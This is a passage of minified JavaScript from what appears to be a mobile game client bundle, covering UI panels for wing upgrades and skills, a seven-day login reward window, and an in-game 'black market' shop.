a=v.WingCC.gridRedPoint(0,o);n.updateRedPoint(a)}},e.prototype.addDisplay=function(){observe(this,this.showBoost,v.WingCC.postBoost),observe(this,this.updateLevel,Ts.wingBoost.levelup),observe(this,this.updateWingData,v.WingCC.postActivate),observe(this,this.updateWingData,v.WingCC.postWingEquip),observe(this,this.setTimeDown,v.WingCC.postWingTime),observe(this,this.updateGodWingItem,v.WingCC.postGodWingData),observe(this,this.updateGodWing,v.WingCC.postGodWingData),observe(this,this.updateGodWing,v.WingCC.postGodWingSuitLv),observe(this,this.updateAppearance,v.WingCC.postWingAppearanceChange),observe(this,this.isShowUpGradeBtn,u.BagCT.ins().postItemChange),observe(this,this.isShowUpGradeBtn,u.BagCT.ins().postItemAdd),observe(this,this.isShowUpGradeBtn,u.BagCT.ins().postItemDel),observe(this,this.updateRedPoint,p.GodWingRedPoint.ins().postGodWingRedPoint),observe(this,this.updateWingData,v.WingCC.postUseDanSuccess),observe(this,this.setRedPoint3,p.GodWingRedPoint.ins().postKeYinRedPoint);var t=h.SubRoles.ins().getSubRoleByIndex(0);for(var e in r.GlobalConfig.WingLevelConfig){var i=r.GlobalConfig.WingLevelConfig[e];i&&i.appearance==t.wingID&&(this.currViewNum=i.level)}this.setWingView(this.currViewNum)},e.prototype.removeDisplay=function(){Timer.stopAll(this),o.DisplayUtils.removeFromParent(this.wingMc),this.wingMc=null},e.prototype.setRedPoint3=function(){},Object.defineProperty(e.prototype,"curRole",{get:function(){return this._curRole},set:function(t){this._curRole=t,this.skin&&(this.updateWingData(),this.updateLevel(),this.updateRedPoint(),this.setRedPoint3())},enumerable:!1,configurable:!0}),e.prototype.updateLevel=function(){this._wingsData=h.SubRoles.ins().getSubRoleByIndex(this.curRole).wingsData,this.currViewNum=this._wingsData.lv,this.updateGodWing()},e.prototype.updateGodWing=function(){var t=h.SubRoles.ins().getSubRoleByIndex(0);if(t&&t.wingSkillData){for(var e=0,i=0;i<v.WingCC.wingSkillDic.length;i++){var n=v.WingCC.wingSkillDic[i];t.wingSkillData.indexOf(n.skillId)>=0&&(e=i)}var o=v.WingCC.wingSkillDic[e],s=r.GlobalConfig.SkillsConfig[o.skillId],a=this._wingsData.lv>=o.wingLv;if(this.pasSkill.data={type:1,cfg:s,isActive:a},a){var l=r.GlobalConfig.SkillsConfig[o.skillId];this.ePasSkillName.text=y.SkillUtil.getName(l)}else this.ePasSkillName.text=gettext("{0}阶翅膀激活",o.wingLv+1);var u=v.WingCC.getGodWingSuitCfg(),p=v.WingCC.getGodWing(0).getSuitLevel()>=u.lv;if(this.gwSkill.data={type:2,cfg:u,isActive:p},p)this.eGwSkillName.text=u.skillname;else{var d=v.WingCC.getNextGodWingLevel(),c=r.GlobalConfig.GodWingSuitConfig[d];this.eGwSkillName.text=gettext("四神羽{0}阶激活",null===c||void 0===c?void 0:c.lv)}this.setWingData()}},e.prototype.updateDans=function(){},e.prototype.onTap=function(t){switch(t.target){case this.openStatusBtn:v.WingCC.sendActivate(this.curRole);break;case this.boostBtn1:this.autoUpStar();break;case this.boostBtn0:v.WingCC.sendWingAppearanceChange(this.curRole,this.currViewNum);
break;case this.rightBtn:this.currViewNum++,this.setWingView(this.currViewNum);break;case this.leftBtn:this.currViewNum--,this.setWingView(this.currViewNum);break;case this.shenyu:win.open(m.WingPasSkillPanel)}},e.prototype.onHelpTap=function(){var t;win.open("CommonHelpWin",null===(t=r.GlobalConfig.HelpInfoConfig[329])||void 0===t?void 0:t.text)},e.prototype.skillClick=function(t){switch(t.currentTarget){case this.pasSkill:win.open(b.WingPasSkillTipsWin,this.pasSkill.data);break;case this.gwSkill:win.open(b.WingPasSkillTipsWin,this.gwSkill.data)}},e.prototype.onDecomClick=function(t){win.open(I.GodWingDescomWin)},e.prototype.autoUpStar=function(){var t=r.GlobalConfig.WingLevelConfig[this._wingsData.lv];if(t)return _.GlobalFun.checkCost(t.itemNum,t.itemId,gettext("|C:0xf3311e&T:所需羽毛不足|"))?void send(Ts.wingBoost,{roleId:this.curRole,type:0}):void S.GameFlashSaleCt.ins().reportWingMaterialNot()},e.prototype.notOpenStatus=function(){this.expGroup.visible=!1,this.rightBtn.visible=!1,this.leftBtn.visible=!1,this.jihuo.visible=!0,this.weijihuo.visible=!0,this.maxInfo.visible=!1,this.decompGrp.visible=!1,this.btnGroup.visible=!1;var t="",e=x.OpenSystem.ins().checkSysOpen(D.SystemType.Wing);e||(t=x.OpenSystem.ins().getNoOpenTips(D.SystemType.Wing)),this.jihuolv.visible=!!t,this.jihuolv.text=t,this.jihuoRed.visible=!t},e.prototype.openStatusOpen=function(){this.rightBtn.visible=!0,this.leftBtn.visible=!0,this.jihuo.visible=!0,this.weijihuo.visible=!1,this.decompGrp.visible=!0,this.btnGroup.visible=!0,this._wingsData.lv>=g.WingEnum.WingMaxLv?(this.expGroup.visible=this.next.visible=!1,this.maxInfo.visible=!0,this.boostBtn1.visible=!1,this.boostBtn0.x=.5*(this.btnGroup.width-this.boostBtn0.width)):(this.expGroup.visible=!0,this.maxInfo.visible=!1,this.boostBtn1.visible=!0,this.boostBtn0.x=25),this.shenyu.visible=d.GameServerCC.serverOpenDay+1>=1},e.prototype.showBoost=function(t){var e=(t[0],t[1]);c.TipsCT.ins().showTips(gettext("祝福值 + {0}",e)),this.expBarChange(),this.updateAtt(),this.isShowUpGradeBtn()},e.prototype.setWingView=function(t){if(this.updateDans(),!(t>g.WingEnum.WingMaxLv||0>t)){var e=r.GlobalConfig.WingLevelConfig[t];e&&(this.wingJie.source="wing_jie"+(t+1),this.wingMc||(this.wingMc=ObjectPool.pop("MovieClip"),this.actEff.addChild(this.wingMc),this.actEff.visible=!0),this.wingMc.playFile(RES_DIR_EFF+e.Vipassana,-1),e.size2?this.wingMc.scaleX=this.wingMc.scaleY=e.size2:this.wingMc.scaleX=this.wingMc.scaleY=1,e.pos2?(this.wingMc.x=e.pos2.x,this.wingMc.y=e.pos2.y):(this.wingMc.x=0,this.wingMc.y=0),this.updateAppearance())}},e.prototype.updateWingData=function(){this._wingsData=h.SubRoles.ins().getSubRoleByIndex(this.curRole).wingsData,this.currViewNum=this._wingsData.lv,this.setWingData()},e.prototype.setWingData=function(){return this.setSeeBtnStatu(),this.setWingView(this.currViewNum),this._wingsData.openStatus?(this.openStatusOpen(),this.expBarChange(),this.updateAtt(),this.isShowUpGradeBtn(),this.setTimeDown(),0==this._lastLv&&(this._lastLv=this._wingsData.lv),void(this._lastLv!=this._wingsData.lv&&(this._lastLv=this._wingsData.lv))):(this.notOpenStatus(),void this.updateAtt())},e.prototype.setSeeBtnStatu=function(){this.currViewNum>=g.WingEnum.WingMaxLv||this.currViewNum>=this._wingsData.lv+1?(this.rightBtn.enabled=!1,this.leftBtn.enabled=!0):this.currViewNum<=0?(this.leftBtn.enabled=!1,this.rightBtn.enabled=!0):(this.leftBtn.enabled=!0,this.rightBtn.enabled=!0)},e.prototype.setTimeDown=function(){var t=r.GlobalConfig.WingLevelConfig[this._wingsData.lv];t&&(Timer.stop(this.refushTimeLabel,this),t.clearTime?(this.clearGroup.visible=!0,this._wingsData.clearTime>0?(this.lastTime.text=gettext("剩余时间："),this.lastTimeDown=Math.floor((n.DateUtils.formatMiniDateTime(this._wingsData.clearTime)-d.GameServerCC.serverTime)/1e3),this.lastTimeDown=Math.max(0,this.lastTimeDown),this.timeLabel.text=n.DateUtils.getFormatBySecond(this.lastTimeDown,1),Timer.stop(this.refushTimeLabel,this),Timer.start(1e3,this.lastTimeDown,this.refushTimeLabel,this)):(this.lastTime.text="",this.timeLabel.text="",Timer.stop(this.refushTimeLabel,this))):this.clearGroup.visible=!1,this.noclean.visible=!1)},e.prototype.refushTimeLabel=function(){this.lastTimeDown>0&&(--this.lastTimeDown,this.timeLabel.text=n.DateUtils.getFormatBySecond(this.lastTimeDown,1))},e.prototype.updateAtt=function(){var t=0,e=0;this._wingsData&&(t=this._wingsData.openStatus?this._wingsData.lv:-1,e=this._wingsData.exp);var i=r.GlobalConfig.WingLevelConfig[t],n=r.GlobalConfig.WingLevelConfig[t+1],o=this.getDanAttrs(t),s=[],h=[],u=l.ActorCC.jobId;if(i)for(var p in i.attr){var d=a.AttributeData.changeJobAttr(i.attr[p].type,u);s[p]={type:d,value:i.attr[p].value}}else for(var p in n.attr){var d=a.AttributeData.changeJobAttr(n.attr[p].type,u);s[p]={type:d,value:0}}var c;if(n){for(var p in n.attr){var d=a.AttributeData.changeJobAttr(n.attr[p].type,u);h[p]={type:d,value:n.attr[p].value}}c=a.AttributeData.AttrAddition(o,h)}var f=a.AttributeData.AttrAddition(o,s),m=[];if(t<g.WingEnum.WingMaxLv)for(var v=this.getAttrStr(f),y=i?i.exp:1,C=e/y,T=this.getAttrStr(c,C),b=0;b<T.length;b++){var w={};w.type=T[b].type,w.curAttr=v[b]?v[b].str:0,w.tempAttr=T[b].tempAttr,w.nextAttr=T[b].str,m.push(w)}else for(var v=this.getAttrStr(f),b=0;b<v.length;b++){var w={};w.type=v[b].type,w.curAttr=v[b].str,w.tempAttr=null,w.nextAttr=null,m.push(w)}this.eArc.source=m},e.prototype.getDanAttrs=function(t){return[]},e.prototype.getAttrStr=function(t,e){void 0===e&&(e=0);for(var i=r.GlobalConfig.WingCommonConfig.tempattr?r.GlobalConfig.WingCommonConfig.tempattr:1,n="",o=[],s="",l=0;l<t.length;l++){var h=t[l].type;if(0!=t[l].type){var u=a.AttributeData.getAttrNameByAttrbute(t[l],!0," ");h==w.AttributeType.atAtkMin||h==w.AttributeType.atAtkMageMin||h==w.AttributeType.atAtkTaoistMin||h==w.AttributeType.atDef?(n=u+" -",e&&(s=Math.floor(e*(i*t[l].value))+" - ")):(n+=u,e&&(s+=Math.floor(e*(i*t[l].value))),o.push({type:h,str:n,tempAttr:s}),n="",s="")}}return o},e.prototype.expBarChange=function(){var t=r.GlobalConfig.WingLevelConfig[this._wingsData.lv],e=t?t.exp:1;this.barLab.text=this._wingsData.exp+"/"+e,this.bar.value=this._wingsData.exp/e*100},e.prototype.isShowUpGradeBtn=function(){if(this.updateDans(),this._wingsData&&!(this._wingsData.lv>=g.WingEnum.WingMaxLv)){var t=r.GlobalConfig.WingLevelConfig[this._wingsData.lv];if(t){this.boostPrice1.visible=!0;var e=(u.BagCT.ins().getBagGoodsCountById(0,this.danItemID),u.BagCT.ins().getBagItemById(t.itemId));e?(this.boostPrice1.setItemId(t.itemId),this.boostPrice1.setPrice(t.itemNum,e.count)):(this.boostPrice1.setItemId(t.itemId),this.boostPrice1.setPrice(t.itemNum,0)),this.boostBtn1.eRp.visible=v.WingCC.canItemGradeupWing(0)}}},e.prototype.updateAppearance=function(){var t,e=h.SubRoles.ins().getSubRoleByIndex(0);this.boostBtn0.enabled=this._wingsData.lv>=this.currViewNum;var i=null===(t=r.GlobalConfig.WingLevelConfig[this.currViewNum])||void 0===t?void 0:t.appearance;this.boostBtn0.label=i==e.wingID?gettext("已穿戴"):gettext("穿 戴"),this.setSeeBtnStatu()},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=x.OpenSystem.ins().checkSysOpen(D.SystemType.Wing);return i||c.TipsCT.ins().showTips(x.OpenSystem.ins().getNoOpenTips(D.SystemType.Wing)),i},e.showCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return x.OpenSystem.ins().checkSysShow(D.SystemType.Wing)},e.prototype.updateRedPoint=function(){},e.prototype.tabRp=function(){return f.WingRedPoint.ins().redPoint||p.GodWingRedPoint.ins().getGodWingRedPoint()},__decorate([callDelay(100)],e.prototype,"setRedPoint3",null),__decorate([callDelay(100)],e.prototype,"updateDans",null),__decorate([callDelay(100)],e.prototype,"updateRedPoint",null),e}(s.BaseView);e.WingPanel=A,window.WingPanel=A,__reflect(A.prototype,"WingPanel",[]),window.WingPanel=A},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WingPasSkillPanel=void 0;var n=i(1),o=i(13),s=i(86),a=i(99),r=i(601),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.curRole=0,e._sn_="WingPasSkillSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.skillList.itemRenderer=r.WingPasSkillItem,this.skillListArr=new eui.ArrayCollection([]),this.skillList.dataProvider=this.skillListArr;var i=o.SubRoles.lookAtTar;(null===i||void 0===i?void 0:i.infoModel)&&i.infoModel.handle&&s.SkillCT.ins().sendSkilInfo(i.infoModel.handle),observe(this,this.initList,s.SkillCT.ins().viewShowSkill),observe(this,this.initList,s.SkillCT.ins().updateSkilInfo),observe(this,this.doAutoSkill,s.SkillCT.ins().doAutoSkill),this.addTouchEvent(this.closeBtn,this.onClick),this.initList()},e.prototype.removeDisplay=function(){if(this.skin){if(this.removeObserve(),this.skillList&&this.skillList.numElements>0)for(var t=0;t<this.skillList.numElements;t++){var e=this.skillList.getElementAt(t);e&&e.ClearObj()}this.skillListArr&&this.skillListArr.replaceAll(null),this.skillList&&(this.skillList.dataProvider=null)}},e.prototype.onClick=function(t){win.close(this)},e.prototype.initList=function(t){void 0===t&&(t=-1);var e=o.SubRoles.ins().getSubRoleByIndex(0);if(e&&e.wingSkillData){for(var i=[],n=0,s=a.WingCC.wingSkillDic;n<s.length;n++){var r=s[n],l={};l.wingSkill=r,l.jihuo=e.wingSkillData.indexOf(r.skillId)>=0,i.push(l)}this.skillListArr.replaceAll(i)}},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return!0},e.prototype.tabRp=function(){return s.SkillCT.ins().rp.v},e.prototype.doAutoSkill=function(){this.initList()},e}(n.BaseView);e.WingPasSkillPanel=l,window.WingPasSkillPanel=l,__reflect(l.prototype,"WingPasSkillPanel",[]),window.WingPasSkillPanel=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WingPasSkillTipsWin=void 0;var n=i(5),o=i(1),s=i(0),a=i(13),r=i(99),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="WingPasSkillTipsSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=t[0];if(null!=i){this.skillItem.data=i;var o=a.SubRoles.ins().getSubRoleByIndex(0);if(this.skillLv.text="",this.skillNext.text="",1==i.type){var l=i.cfg,h=s.GlobalConfig.SkillsDescConfig[l.desc];this.skillName.text=h.name,this.skillDes.text=h.desc,this.skillDes.textFlow=n.TextFlowMaker.generateTextFlow1(h.desc);for(var u=0,p=r.WingCC.wingSkillDic;u<p.length;u++){var d=p[u],c=o.wingSkillData.indexOf(d.skillId)>=0;if(!c){i.isActive?this.skillNext.text=gettext("{0}阶解锁下一等级",d.wingLv+1):this.skillNext.text=gettext("{0}阶翅膀激活",d.wingLv+1);break}}}else if(2==i.type){var f=i.cfg;this.skillName.text=f.skillname,this.skillLv.text="LV."+f.skilllevel,this.skillDes.textFlow=n.TextFlowMaker.generateTextFlow1(f.skilldesc);var g=r.WingCC.getNextGodWingLevel();if(g){var m=s.GlobalConfig.GodWingSuitConfig[g];i.isActive?this.skillNext.text=gettext("四神羽{0}阶解锁下一等级",m.lv):this.skillNext.text=gettext("四神羽{0}阶激活",m.lv)}else this.skillNext.text=""}}},e.prototype.removeDisplay=function(){this.skin&&this.removeObserve()},e}(o.BaseView);e.WingPasSkillTipsWin=l,window.WingPasSkillTipsWin=l,__reflect(l.prototype,"WingPasSkillTipsWin",[]),window.WingPasSkillTipsWin=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WingSkillItemRender=void 0;var n=i(49),o=i(3),s=function(t){function e(){var e=t.call(this)||this;return e.touchEnabled=!1,e._sn_="WingSkillItemSkin",e}return __extends(e,t),e.prototype.dataChanged=function(){if(this.data){if(1==this.data.type){var t=this.data.cfg;this.skillIcon.source=t.id+"_png"}else if(2==this.data.type){var e=this.data.cfg;this.skillIcon.source=e.skillicon+"_png"}else if(6==this.data.type){var e=this.data.cfg.id;this.skillIcon.source=1e3*Math.floor(e/1e3)+"_png"}this.data.isActive?this.skillIcon.filters=[]:this.skillIcon.filters=n.FilterUtil.ARRAY_GRAY_FILTER}},e}(o.BaseItemRender);e.WingSkillItemRender=s,window.WingSkillItemRender=s,__reflect(s.prototype,"WingSkillItemRender",[]),window.WingSkillItemRender=s},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RuneDecomposeItemRenderer=void 0;var n=i(3),o=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.select=!1,e.touchChildren=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.dataChanged=function(){var t=this.data,e=t.itemData,i=t.isSelected;this.itemIcon.setPos(e),this.select=i},e}(n.BaseItemRender);e.RuneDecomposeItemRenderer=o,window.RuneDecomposeItemRenderer=o,__reflect(o.prototype,"RuneDecomposeItemRenderer",[])},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SevenDayLogWin=void 0;var n=i(602),o=i(1),s=i(11),a=i(9),r=i(0),l=i(24),h=i(2),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="act14logSkin1",e}return __extends(e,t),e.prototype.skinComplete=function(){this.card.itemRenderer=n.SevenDayLogItem,this.cardsData=new eui.ArrayCollection,this.card.dataProvider=this.cardsData,this.reward.itemRenderer=s.ItemBase},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.updateDayNum(),this.cardMoveTo(this.dayNum),this.addTouchEvent(this,this.onClick),this.card.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onListChange,this),observe(this,this.postSevendayIsAwards,a.Activity.ins().postSevendayIsAwards),this.update()},e.prototype.postSevendayIsAwards=function(){for(var t=r.GlobalConfig.LoginRewardsConfig,e=l.CommonUtils.getObjectLength(t),i=a.Activity.ins().isAwards,n=0,o=1;e>=o;o++)if(a.Activity.ins().dayNum>=t[o].day&&0==(i>>t[o].day&1)){n=o;break}0==n&&(n=a.Activity.ins().dayNum+1<=e?a.Activity.ins().dayNum+1:this.dayNum),this.dayNum=n,this.cardMoveTo(this.dayNum),this.update(),this.card.selectedIndex=this.dayNum-1},e.prototype.updateCards=function(){this.cardsData.replaceAll(l.CommonUtils.objectToArray(r.GlobalConfig.LoginRewardsConfig))},e.prototype.onListChange=function(t){this.dayNum=t.itemIndex+1,this.updateUI()},e.prototype.cardMoveTo=function(t){var e=this;egret.callLater(function(){var i=r.GlobalConfig.LoginRewardsConfig,n=l.CommonUtils.getObjectLength(i),o=200;e.eScroller.viewport.scrollH=o*(Math.min(t,n-3)-1)},this)},e.prototype.updateDayNum=function(){var t=r.GlobalConfig.LoginRewardsConfig,e=l.CommonUtils.getObjectLength(t);if(!this.dayNum){this.dayNum=Math.max(1,a.Activity.ins().dayNum);for(var i=a.Activity.ins().isAwards,n=1;e>=n;n++)if(this.dayNum>=t[n].day&&0==(i>>t[n].day&1)){this.dayNum=n;break}}this.card.selectedIndex=this.dayNum-1},e.prototype.update=function(){this.updateCards(),this.updateUI()},e.prototype.updateUI=function(){var t=r.GlobalConfig.LoginRewardsConfig[this.dayNum];if(t){this.daylabel.visible=!0,this.daylabel.text=gettext("登陆天数：")+a.Activity.ins().dayNum,this.reward.dataProvider=new eui.ArrayCollection(t.rewards);var e=1==(a.Activity.ins().isAwards>>this.dayNum&1);a.Activity.ins().dayNum>=this.dayNum?e?(this.daylabel.visible=!1,this.suerBtn.enabled=!1,this.redPoint.visible=!1):(this.suerBtn.enabled=!0,this.redPoint.visible=!0):(this.suerBtn.enabled=!1,this.redPoint.visible=!1)}},e.prototype.onClick=function(t){switch(t.target){case this.suerBtn:a.Activity.ins().dayNum>=this.dayNum?a.Activity.ins().sendGetSevenDayAwards(this.dayNum):h.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:登陆天数不足，无法领取|"))}},e.prototype.tabRp=function(){return a.Activity.ins().getSevenDayStast()},__decorate([delayCall()],e.prototype,"cardMoveTo",null),e}(o.BaseView);e.SevenDayLogWin=u,window.SevenDayLogWin=u,__reflect(u.prototype,"SevenDayLogWin",[]),window.SevenDayLogWin=u},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BlackMarketPanel=void 0;var n=i(18),o=i(8),s=i(5),a=i(1),r=i(0),l=i(4),h=i(6),u=i(10),p=i(2),d=i(27),c=i(63),f=i(52),g=i(1743),m=i(1744),v=i(11),y=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="BlackMarketSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.listView.itemRenderer=g.BlackMarketItemRenderer,this.price.text=r.GlobalConfig.StoreCommonConfig.refreshYuanBao+"",this.eList.itemRenderer=v.ItemBase;var t=[];for(var e in r.GlobalConfig.TreasureOverViewConfig)t.push(r.GlobalConfig.TreasureOverViewConfig[e].itemId);this.eList.dataProvider=new eui.ArrayCollection(t)},e.prototype.addDisplay=function(){this.addTouchEvent(this,this.onTap),this.addTouchEvent(this.buyAllItemBtn,this.buyAllItem),this.addTouchEvent(this.refreshShopBtn,this.refreshShop),observe(this,this.updateData,f.Shop.ins().postUpdateShopData),observe(this,this.buyResultCB,f.Shop.ins().postBuyResult),observe(this,this.updateRedPoint,m.ShopRedPoint.ins().postBlackMarketRedPoint),this.updateData(),this.refushEndTime(),Timer.has(this.refushEndTime,this)||(Timer.start(1e3,f.Shop.ins().shopData.refushTime,this.refushEndTime,this),this.refushEndTime())},e.prototype.removeDisplay=function(){Timer.stop(this.refushEndTime,this)},e.prototype.updateRedPoint=function(){this.redPoint.visible=m.ShopRedPoint.ins().blackMarketRedPoint},e.prototype.buyAllItem=function(){for(var t=[],e=0,i=0,n=0,o=f.Shop.ins().shopData,s=o.getShopEquipDataLength(),a=null,r=0,d=0;s>d;d++)if(a=o.getShopEquipDataByIndex(d),null!=a){if(0==u.ItemUtil.getType(a.item.itemConfig)){if(r=h.BagCT.ins().calculationScore(a.item),!(r>0))continue;n+=1}t.push([a.id,1]),1==a.costType?e+=a.costNum:i+=a.costNum}if(h.BagCT.ins().getAllSurplusCount(n)<=0){var g=gettext("背包已满，无法全部购买");return void p.TipsCT.ins().showTips(g)}return l.ActorCC.gold<e?void c.WarnCT.ins().setBuyGoodsWarn(1):l.ActorCC.yb<i?void p.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:元宝不足|")):0==e&&0==i?void p.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:没有物品可买！|")):void f.Shop.ins().sendBuy(2,t)},e.prototype.refreshShop=function(t){if(f.Shop.ins().shopData.times>r.GlobalConfig.StoreCommonConfig.refreshLimit)return void p.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:今日刷新次数已用完！|"));if(f.Shop.ins().shopData.refushTime<=0)f.Shop.ins().sendRefreshShop();else{var e=h.BagCT.ins().getBagGoodsByTypeAndId(h.BagCT.BAG_TYPE_OTHTER,r.GlobalConfig.StoreCommonConfig.refreshItem),i=e?e.count:0;if(i)f.Shop.ins().sendRefreshShop();else{if(l.ActorCC.yb<r.GlobalConfig.StoreCommonConfig.refreshYuanBao)return void p.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:元宝不足|"));f.Shop.ins().sendRefreshShop()}}},e.prototype.onTap=function(t){if("buy"==t.target.name){if(h.BagCT.ins().getAllSurplusCount(1)<=0){var e=gettext("背包已满，无法购买");return void p.TipsCT.ins().showTips(e)}var i=t.target.parent.goodsID,n=f.Shop.ins().shopData.getShopEquipDataById(i);if(1==n.costType&&l.ActorCC.gold<n.costNum)return void c.WarnCT.ins().setBuyGoodsWarn(1);if(l.ActorCC.yb<n.costNum)return void p.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:元宝不足|"));var o=n.item,s=u.ItemUtil.getJob(o.itemConfig),a=u.ItemUtil.getType(o.itemConfig);if(0==a&&0!=s){var r=h.BagCT.ins().calculationScore(o);if(r>0){var g=[i,1];f.Shop.ins().sendBuy(2,[g])}else d.WarnWin.show(gettext("购买失败\n\n<font color='#f3311e'>该装备评分过低无法购买</font>"),function(){},this,null,null,"sure")}else{var g=[i,1];f.Shop.ins().sendBuy(2,[g])}}},e.prototype.buyResultCB=function(t){1==t?p.TipsCT.ins().showTips(gettext("购买成功")):p.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:购买失败|")),this.updateOthersUI()},e.prototype.updateOthersUI=function(){var t=r.GlobalConfig.StoreCommonConfig.refreshItem,e=h.BagCT.ins().getBagGoodsByTypeAndId(h.BagCT.BAG_TYPE_OTHTER,t),i=e?e.count:0,o="";o=i?n.ColorUtil.GREEN_COLOR:n.ColorUtil.RED_COLOR,this.eItem.source=u.ItemUtil.getItemSource(r.GlobalConfig.ItemConfig[t]),this.keylabel.textFlow=s.TextFlowMaker.generateTextFlow("<font color="+o+">"+i+"</font> "),f.Shop.ins().shopData.refushTime<=0?this.refreshShopBtn.label=gettext("免费刷新"):this.refreshShopBtn.label=gettext("刷   新")},e.prototype.updateData=function(){for(var t=[],e=f.Shop.ins().shopData,i=e.getShopEquipDataLength(),n=null,o=0;i>o;o++)n=e.getShopEquipDataByIndex(o),null!=n&&t.push(n);this.listView.dataProvider=new eui.ArrayCollection(t),t.length<=0?this.noGoods.visible=!0:this.noGoods.visible=!1,this.point.text=gettext("我的积分：")+f.Shop.ins().shopData.point,this.updateOthersUI(),this.updateRedPoint()},e.prototype.refushEndTime=function(){this.tip.text=gettext("下批商品刷新时间：")+o.DateUtils.getFormatBySecond(f.Shop.ins().shopData.refushTime),this.tipsBg.visible=this.tip.visible=this.costGroup.visible=!0,f.Shop.ins().shopData.refushTime<=0&&(this.tipsBg.visible=this.tip.visible=this.costGroup.visible=!1)},e.prototype.tabRp=function(){return m.ShopRedPoint.ins().blackMarketRedPoint},e}(a.BaseView);e.BlackMarketPanel=y,window.BlackMarketPanel=y,__reflect(y.prototype,"BlackMarketPanel",[]),window.BlackMarketPanel=y},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BlackMarketItemRenderer=void 0;var n=i(3),o=i(52),s=i(0),a=i(10),r=i(6),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="BlackMarketItem",e.goodsID=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.itemIcon.addEventListener(egret.TouchEvent.TOUCH_TAP,this.showTip,this)},e.prototype.dataChanged=function(){var t=this.data,i=t.item,n=s.GlobalConfig.ItemConfig[i.configID];this.goodsID=t.id;var l="";if(l=2==t.costType?t.costNum+"":t.costNum>1e5?gettext("{0}万",Math.floor(t.costNum/1e4)):t.costNum+"",this.money.text=l,this.itemName.text=n.name,this.itemName.textColor=a.ItemUtil.getQualityColor(a.ItemUtil.getQuality2(n)),n.zsLevel&&n.zsLevel>0?this.level.text=gettext("({0}转)",n.zsLevel):n.level&&n.level>0?this.level.text="(Lv."+n.level+")":this.level.text="",this.level.x=this.itemName.x+this.itemName.width,this.num.text=1==i.count?"":i.count+"",this.moneyIcon.source=e.moneyTypeToIcon[t.costType],this.itemIcon.setData(n),0!=a.ItemUtil.getJob(n)){var h=r.BagCT.ins().calculationScore(t.item);h>0?(this.arrowIcon.visible=!0,this.CEKey.visible=!0,this.CEValue.visible=!0,this.CEValue.text=h+""):(this.arrowIcon.visible=!1,this.CEKey.visible=!1,this.CEValue.visible=!1)}else this.arrowIcon.visible=!1,this.CEKey.visible=!1,this.CEValue.visible=!1;var u=o.ShopEquipData.discountDic[t.discountType];if(u)this.discount.source=u.res,this.wuzhe.visible=!1;else{var p=s.GlobalConfig.EquipItemConfig[this.goodsID];this.discount.source=p.discountImg,this.wuzhe.visible=!1}},e.prototype.showTip=function(){for(var t,e=o.Shop.ins().shopData,i=e.getShopEquipDataLength(),n=null,r=0;i>r;r++)if(n=e.getShopEquipDataByIndex(r),null!=n&&n.id==this.goodsID){t=n.item.configID;break}void 0==t&&new Error("竟然没有找到该商品ID");var l=s.GlobalConfig.ItemConfig[t],h=a.ItemUtil.getType(l);void 0!=h&&(0==h?win.open("EquipDetailedWin",1,this.data.item.handle,l.id):win.open("ItemDetailedWin",0,l.id,this.data.item.count))},e.moneyTypeToIcon=[gettext("占位"),"szjinbi","szyuanbao"],e}(n.BaseItemRender);e.BlackMarketItemRenderer=l,window.BlackMarketItemRenderer=l,__reflect(l.prototype,"BlackMarketItemRenderer",[]),window.BlackMarketItemRenderer=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ShopRedPoint=void 0;var n=i(14),o=i(52),s=function(t){function e(){var e=t.call(this)||this;return e.nfirstLogin=0,e.blackMarketRedPoint=0,observe(e,e.postBlackMarketRedPoint,o.Shop.ins().postUpdateShopData),e}return __extends(e,t),e.prototype.postBlackMarketRedPoint=function(){var t=this.blackMarketRedPoint;return this.blackMarketRedPoint=o.Shop.ins().shopData.refushTime<=0?1:0,this.blackMarketRedPoint==t?null:this.blackMarketRedPoint},__decorate([post()],e.prototype,"postBlackMarketRedPoint",null),e}(n.BaseSystem);e.ShopRedPoint=s,window.ShopRedPoint=s,__reflect(s.prototype,"ShopRedPoint",[]),Systemap.ShopRedPoint=function(){return s.ins()},window.ShopRedPoint=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HonorMarketPanel=void 0;var n=i(5),o=i(1),s=i(538),a=i(0),r=i(4),l=i(63),h=i(168),u=i(52),p=function(t){function e(){var e=t.call(this)||this;return 